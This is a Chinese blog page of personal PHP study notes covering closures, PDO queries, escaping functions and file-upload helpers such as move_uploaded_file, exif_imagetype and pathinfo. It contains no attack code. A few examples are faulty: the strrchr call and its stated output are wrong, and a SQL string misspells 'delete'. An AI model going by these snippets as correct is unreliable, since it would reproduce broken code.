<h3 id="方法function"><a href="#方法function" class="headerlink" title="方法function"></a>方法function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php -S localhost:4000</span></span><br><span class="line">     <span class="comment">//无参数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">echo</span> func();</span><br><span class="line"></span><br><span class="line">     <span class="comment">//有参数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span>=<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$z</span> = <span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$z</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">echo</span> add(<span class="number">1</span>);<span class="comment">//当不给第二个参数，就用默认值</span></span><br><span class="line">     <span class="keyword">echo</span> add(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">//当给第二个参数，就用自定义的值，覆盖掉默认的值</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//在函数内调用外部变量use</span></span><br><span class="line">     <span class="variable">$a</span> = <span class="string">&quot;456&quot;</span>;</span><br><span class="line">     <span class="comment">//如果不用use就无法调用外部变量</span></span><br><span class="line">     <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$variable</span>.<span class="string">&#x27;---&#x27;</span>.<span class="variable">$a</span>;<span class="comment">//这里调用外部变量会报错</span></span><br><span class="line">     &#125;;<span class="comment">//注意，PHP中匿名函数后面必须要加分号</span></span><br><span class="line">     <span class="comment">//使用use可以调用并使用外部变量，且外部变量的定义必须在调用其的函数之前定义</span></span><br><span class="line">     <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$variable</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$variable</span>.<span class="string">&#x27;---&#x27;</span>.<span class="variable">$a</span>;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="variable">$var</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">     <span class="variable">$func</span>(<span class="variable">$var</span>);<span class="comment">//输出123---456</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">//函数内部调用函数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span>, <span class="variable">$z</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>-<span class="subst">$y</span>-<span class="subst">$z</span>&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$z</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$x</span>, <span class="variable">$y</span></span>)</span>&#123;</span><br><span class="line">         foo(<span class="variable">$x</span>, <span class="variable">$y</span>, <span class="variable">$z</span>);</span><br><span class="line">       &#125;;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="variable">$bar</span> = bar(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">     <span class="variable">$bar</span>(<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//用字符串调用命名函数</span></span><br><span class="line">     <span class="variable">$func_name</span> = <span class="string">&#x27;add&#x27;</span>;<span class="comment">//有参数部分的函数名</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$func_name</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//func_get_arg,func_get_args,func_num_args</span></span><br><span class="line">     <span class="comment">//func_get_arg(n)返回第n-1位参数的值</span></span><br><span class="line">     <span class="comment">//func_get_args返回所有参数的数组</span></span><br><span class="line">     <span class="comment">//func_num_args返回参数的个数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">foo1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$numargs</span> = func_num_args();</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Number of arguments: <span class="subst">$numargs</span>&lt;/br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$numargs</span> &gt;= <span class="number">2</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Second argument is:&quot;</span>.func_get_arg(<span class="number">1</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$arg_list</span> = func_get_args();</span><br><span class="line">       <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$numargs</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Argument <span class="subst">$i</span> is: &quot;</span>.<span class="variable">$arg_list</span>[<span class="variable">$i</span>].<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     foo1(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure>



<h3 id="classes-类"><a href="#classes-类" class="headerlink" title="classes 类"></a>classes 类</h3><h3 id="search-php"><a href="#search-php" class="headerlink" title="search.php"></a>search.php</h3><h4 id="PDO类代表PHP和数据库服务之间的一个连接"><a href="#PDO类代表PHP和数据库服务之间的一个连接" class="headerlink" title="PDO类代表PHP和数据库服务之间的一个连接"></a>PDO类代表PHP和数据库服务之间的一个连接</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用PDO连接mysql数据库</span></span><br><span class="line"><span class="comment">//PDO为PHP访问数据库定义了一个轻量级一致接口</span></span><br><span class="line"><span class="comment">//一致指不管使用哪种数据库都可以用相同的函数来查询和获取数据</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//$url为本机ip地址</span></span><br><span class="line">    <span class="comment">//$dbname 数据库名称</span></span><br><span class="line">	<span class="variable">$pdo</span> = <span class="string">&quot;mysql:host=<span class="subst">$url</span>;dbname=<span class="subst">$dbname</span>&quot;</span>;</span><br><span class="line">    <span class="comment">//$name 数据库的用户名</span></span><br><span class="line">    <span class="comment">//$pwd 数据库对应用户的密码</span></span><br><span class="line">	<span class="variable">$obj</span> = <span class="keyword">new</span> PDO(<span class="variable">$pdo</span>, <span class="variable">$name</span>, <span class="variable">$pwd</span>);</span><br><span class="line">    <span class="comment">//exec执行一条sql，返回的结果是当前操作影响的列数    增删改</span></span><br><span class="line">    <span class="comment">//query执行一条sql，返回一个包含所有请求数据的对象     查</span></span><br><span class="line">    <span class="comment">//fetch 读取请求所返回的数据对象的一条记录</span></span><br><span class="line">    <span class="comment">//fetchAll  读取请求所返回的数据对象的所有记录</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//添加</span></span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;insert into <span class="subst">$table</span> values(x,x,x)&quot;</span>;</span><br><span class="line">	<span class="variable">$res</span> = <span class="variable">$obj</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="comment">//删除</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;deletd from <span class="subst">$table</span> where id=1&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$obj</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="comment">//修改</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;update <span class="subst">$table</span> set &#x27;...&#x27; where &#x27;...&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$obj</span>-&gt;exec(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="comment">//查询</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from <span class="subst">$table</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$obj</span>-&gt;query(<span class="variable">$sql</span>)-&gt;fetch(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="set-name-UTF-8防止出现乱码"><a href="#set-name-UTF-8防止出现乱码" class="headerlink" title="set name UTF-8防止出现乱码"></a>set name UTF-8防止出现乱码</h4><p><img src="D:\blog\H01iday\source_posts\pics\character%.png" alt="character%"></p>
<h4 id="json-encode对变量进行JSON编码"><a href="#json-encode对变量进行JSON编码" class="headerlink" title="json_encode对变量进行JSON编码"></a>json_encode对变量进行JSON编码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>, <span class="string">&#x27;c&#x27;</span>=&gt;<span class="number">3</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);<span class="comment">//Array ( [a] =&gt; 1 [b] =&gt; 2 [c] =&gt; 3 )</span></span><br><span class="line"><span class="keyword">echo</span> json_encode(<span class="variable">$arr</span>);<span class="comment">// &#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//addslashes函数返回在预定义字符之前添加反斜杠的字符串</span></span><br><span class="line"><span class="comment">//预定义字符是：单引号（&#x27;）双引号（&quot;）反斜杠（\）</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;h&quot;e\llo world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> addslashes(<span class="variable">$str</span>);<span class="comment">//output:h\&quot;e\\llo world</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="addsclasses"><a href="#addsclasses" class="headerlink" title="addsclasses"></a>addsclasses</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars"></a>htmlspecialchars</h4><p>执行替换</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>替换后</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;</code> (&amp; 符号)</td>
<td>&amp;amp;</td>
</tr>
<tr>
<td><code>&quot;</code> (双引号)</td>
<td>&amp;quot;  除非设置了 <strong><code>ENT_NOQUOTES</code></strong></td>
</tr>
<tr>
<td><code>&#39;</code> (单引号)</td>
<td>&amp;#039;&amp;apos;</td>
</tr>
<tr>
<td><code>&lt;</code> (小于)</td>
<td>&amp;lt;</td>
</tr>
<tr>
<td><code>&gt;</code> (大于)</td>
<td>&amp;gt;</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="comment">//output:This is some bold text. [其中bold被加粗]  </span></span><br><span class="line"><span class="comment">//网页源代码[即html代码]：This is some &lt;b&gt;bold&lt;/b&gt; text</span></span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">//output:This is some &lt;b&gt;bold&lt;/b&gt; text.</span></span><br><span class="line"><span class="comment">//网页源代码：This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//htmlspecialchars(string, flags, character-set, double_encode)</span></span><br><span class="line"><span class="comment">//string指要转换的字符串</span></span><br><span class="line"><span class="comment">//flag规定如何处理引号等</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Hello &amp; &#x27;World&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$string1</span> = htmlspecialchars(<span class="variable">$string</span>, ENT_COMPAT); <span class="comment">// 默认，仅编码双引号</span></span><br><span class="line"><span class="variable">$string2</span> = htmlspecialchars(<span class="variable">$string</span>, ENT_QUOTES); <span class="comment">// 编码双引号和单引号</span></span><br><span class="line"><span class="variable">$string3</span> = htmlspecialchars(<span class="variable">$string</span>, ENT_NOQUOTES); <span class="comment">// 不编码任何引号</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$string1</span>.<span class="string">&quot;&lt;br/&gt;\n&quot;</span>;</span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$string2</span>.<span class="string">&quot;&lt;br/&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$string3</span>.<span class="string">&quot;&lt;br/&gt;\n&quot;</span>;</span><br></pre></td></tr></table></figure>



<h4 id="move-uploaded-file-file-newlocation"><a href="#move-uploaded-file-file-newlocation" class="headerlink" title="move_uploaded_file(file, newlocation)"></a>move_uploaded_file(file, newlocation)</h4><p>将上传的文件移动到新位置。</p>
<p>file：规定要移动的文件</p>
<p>newlocation：规定文件的新位置</p>
<h4 id="全局变量-FILE"><a href="#全局变量-FILE" class="headerlink" title="全局变量$_FILE"></a>全局变量$_FILE</h4><p>包含所有上传的文件信息。 例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">action</span>=<span class="string">&quot;__URL__&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MAX_FILE_SIZE must precede the file input field --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">value</span>=<span class="string">&quot;30000&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--使用该隐藏域之后，可以在用户提交之后，文件上传之前就进行限制判断，超过限制，马上做出$_FILES[&#x27;error&#x27;] =2的错误。这样就可以避免等一个大文件传上服务器以后才发现超过限制了--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Name of input element determines name in $_FILES array --&gt;</span></span><br><span class="line">    Send this file: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;userfile&quot;</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send File&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由代码可知，文件上传字段的名称为userfile</p>
<p>$_FILES[‘userfile’][‘name’]</p>
<p>客户端机器文件的原名称。</p>
<p>$_FILES[‘userfile’][‘type’]</p>
<p>文件的 MIME 类型</p>
<p>$_FILES[‘userfile’][‘size’]</p>
<p>已上传文件的大小，单位为字节。</p>
<p>$_FILES[‘userfile’][‘tmp_name’]</p>
<p>文件被上传后在服务端储存的临时文件名。</p>
<p>$_FILES[‘userfile’][‘error’]</p>
<p>和该文件上传相关的错误代码</p>
<h4 id="strrchr-string-char-函数"><a href="#strrchr-string-char-函数" class="headerlink" title="strrchr(string,char)函数"></a>strrchr(string,char)函数</h4><p>查找字符串在另一个字符串中最后一次出现的位置，返回从该位置到字符串结尾的所有字符</p>
<p>char参数还可以是ASCII值</p>
<p>例:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> strrchr(<span class="string">&quot;Hello world! What a beautiful day!&quot;</span>,What);</span><br><span class="line">&gt;&gt;output:what a beautiful day</span><br></pre></td></tr></table></figure>



<h4 id="substr-string-start-length-函数"><a href="#substr-string-start-length-函数" class="headerlink" title="substr(string, start, length)函数"></a>substr(string, start, length)函数</h4><p>string必须；start必须；length可选</p>
<p>start:0为第一个字符，正数为指定位置开始，负数为从结尾开始</p>
<h4 id="move-uploaded-file-file-newlocation-函数"><a href="#move-uploaded-file-file-newlocation-函数" class="headerlink" title="move_uploaded_file(file, newlocation)函数"></a>move_uploaded_file(file, newlocation)函数</h4><p>将上传的文件移动到新位置</p>
<p>成功返回true，否则返回false</p>
<h4 id="is-uploaded-file-string-filename"><a href="#is-uploaded-file-string-filename" class="headerlink" title="is_uploaded_file(string $filename)"></a>is_uploaded_file(string $filename)</h4><p>判断文件是否通过HTTP POST上传的</p>
<h4 id="strrpos-string-find-start）"><a href="#strrpos-string-find-start）" class="headerlink" title="strrpos(string,find,start）"></a>strrpos(string,find,start）</h4><p>查找某字符串在零一字符串中最后一次出现位置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> strrpos(<span class="string">&quot;You love php, I love php too!&quot;</span>,<span class="string">&quot;php&quot;</span>);<span class="comment">//output:21</span></span><br></pre></td></tr></table></figure>



<h4 id="exif-imagetype-filename-判断一个图像的类型"><a href="#exif-imagetype-filename-判断一个图像的类型" class="headerlink" title="exif_imagetype(filename)判断一个图像的类型"></a>exif_imagetype(filename)判断一个图像的类型</h4><p>如果filename对应的文件是图像类型，则返回对应类型的常量。如IMAGETYPE_GIF</p>
<p>如果不是图像类型返回false</p>
<p>通过读取一个图像的第一个字节并检查其签名 判断图像类型</p>
<h4 id="file-exists-path"><a href="#file-exists-path" class="headerlink" title="file_exists(path)"></a>file_exists(path)</h4><p>查看文件/目录是否存在</p>
<h4 id="trim-string-charlist"><a href="#trim-string-charlist" class="headerlink" title="trim(string,[charlist])"></a>trim(string,[charlist])</h4><p>移除字符串两侧的字符串</p>
<p>String：要检查的字符串。</p>
<p>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除null及所有空白符</p>
<h4 id="deldot-filename"><a href="#deldot-filename" class="headerlink" title="deldot(filename)"></a>deldot(filename)</h4><p>删除文件名末尾的点</p>
<h4 id="str-ireplace-find-replace-string-count"><a href="#str-ireplace-find-replace-string-count" class="headerlink" title="str_ireplace(find, replace, string, [count])"></a>str_ireplace(find, replace, string, [count])</h4><p>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）</p>
<p>find：要查找的值，即要进行替换的值</p>
<p>replace：替换find的值</p>
<p>string：被搜索的字符串</p>
<p>count：可选，替换次数</p>
<h4 id="preg-match-string-pattern-string-subjuect-函数"><a href="#preg-match-string-pattern-string-subjuect-函数" class="headerlink" title="preg_match(string pattern, string subjuect)函数"></a>preg_match(string pattern, string subjuect)函数</h4><p>执行一个正则表达式，查看字符串subject中是否有满足pattern要求的内容</p>
<p>pattern：要匹配的正则表达式</p>
<p>subject：查找的字符串</p>
<p>例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;查找到匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;未发现匹配的字符串 php。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="explode-分隔符，字符串，-最多进行多少次分割limit-："><a href="#explode-分隔符，字符串，-最多进行多少次分割limit-：" class="headerlink" title="explode(分隔符，字符串，[最多进行多少次分割limit]) ："></a><strong>explode(分隔符，字符串，[最多进行多少次分割limit]) ：</strong></h4><p>​        例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;one,two,three,four&#x27;</span>;</span><br><span class="line">print_r(explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,<span class="number">0</span>));<span class="comment">//Array ( [0] =&gt; one,two,three,four ) </span></span><br><span class="line">print_r(explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,<span class="number">2</span>));<span class="comment">//Array ( [0] =&gt; one [1] =&gt; two,three,four )</span></span><br><span class="line">print_r(explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,-<span class="number">1</span>));<span class="comment">//Array ( [0] =&gt; one [1] =&gt; two [2] =&gt; three ) 除了最后limit个其它所有元素</span></span><br></pre></td></tr></table></figure>

<h4 id="array-pop-删除数组中的最后一个元素"><a href="#array-pop-删除数组中的最后一个元素" class="headerlink" title="array_pop()删除数组中的最后一个元素"></a><strong>array_pop()删除数组中的最后一个元素</strong></h4><h4 id="in-array-search-array-type-搜索数组中是否存在指定的值"><a href="#in-array-search-array-type-搜索数组中是否存在指定的值" class="headerlink" title="in_array(search, array,[type])搜索数组中是否存在指定的值"></a>in_array(search, array,[type])搜索数组中是否存在指定的值</h4><h4 id="search-在数组中搜索的值"><a href="#search-在数组中搜索的值" class="headerlink" title="search:在数组中搜索的值"></a>search:在数组中搜索的值</h4><p>​    array:要搜索的数组</p>
<p>​    type:如果为true，还需要判断search的类型和数组元素的类型是否一致</p>
<h4 id="fputs-file-string-length"><a href="#fputs-file-string-length" class="headerlink" title="fputs(file, string, [length])"></a>fputs(file, string, [length])</h4><p>​    file：要打开的文件</p>
<p>​    string：要写入文件的字符串</p>
<p>​    length：规定要写入的最大字节数。</p>
<h4 id="fopen-filename-mode"><a href="#fopen-filename-mode" class="headerlink" title="fopen(filename, mode)"></a>fopen(filename, mode)</h4><table>
<thead>
<tr>
<th>mode</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>只读</td>
</tr>
<tr>
<td>r+</td>
<td>读写</td>
</tr>
<tr>
<td>w</td>
<td>清除原内容 写  文件不存在则新建 指针指向文件头</td>
</tr>
<tr>
<td>w+</td>
<td>清除原内容 读写  文件不存在则新建 指针指向文件头</td>
</tr>
<tr>
<td>a</td>
<td>写 文件不存在则新建 指针指向文件尾</td>
</tr>
<tr>
<td>a+</td>
<td>读写文件不存在则新建 指针指向文件尾</td>
</tr>
</tbody></table>
<h4 id=""><a href="#" class="headerlink" title="@"></a>@</h4><p>@在php中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。</p>
<h4 id="basename-path-suffix"><a href="#basename-path-suffix" class="headerlink" title="basename(path,[suffix])"></a>basename(path,[suffix])</h4><p>返回路径中的文件名部分。</p>
<table>
<thead>
<tr>
<th>path</th>
<th>必需。规定要检查的路径。</th>
</tr>
</thead>
<tbody><tr>
<td><strong>suffix</strong></td>
<td><strong>可选。规定文件扩展名。如果文件的拓展名是suffix，则不输出拓展名。否则，输出文件对应的拓展名</strong></td>
</tr>
</tbody></table>
<p>例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$path = &quot;/testweb/home.php&quot;;</span><br><span class="line"></span><br><span class="line">//显示带有文件扩展名的文件名</span><br><span class="line">echo basename($path);//output:home.php</span><br><span class="line"></span><br><span class="line">//显示不带有文件扩展名的文件名</span><br><span class="line">echo basename($path,&quot;.php&quot;);//output:home</span><br><span class="line"></span><br><span class="line">//如果suffix不相同</span><br><span class="line">echo basename($path,&quot;.jpg&quot;);//output:home.php</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<h4 id="pathinfo-path-options-函数"><a href="#pathinfo-path-options-函数" class="headerlink" title="pathinfo(path, [options])函数"></a>pathinfo(path, [options])函数</h4><p>以数组形式返回关于文件路径pathinfo的信息</p>
<p>path：进行检查的路径</p>
<p>options:默认all</p>
<p>​                可以是</p>
<p>​                        PATHINFO_DIRNAME - 只返回 dirname目录路径</p>
<p>​                        PATHINFO_BASENAME - 只返回 basename文件名</p>
<p>​                        PATHINFO_EXTENSION - 只返回 extension文件后缀名</p>
<p>​                        PATHINFO_FILENAME - 只返回 filename不包含后缀的文件名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">print_r(pathinfo(<span class="string">&quot;/testweb/test.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//output </span></span><br><span class="line"> <span class="keyword">Array</span> ( [dirname] =&gt; /testweb</span><br><span class="line">         [basename] =&gt; test.txt </span><br><span class="line">         [extension] =&gt; txt </span><br><span class="line">         [filename] =&gt; test )</span><br></pre></td></tr></table></figure>





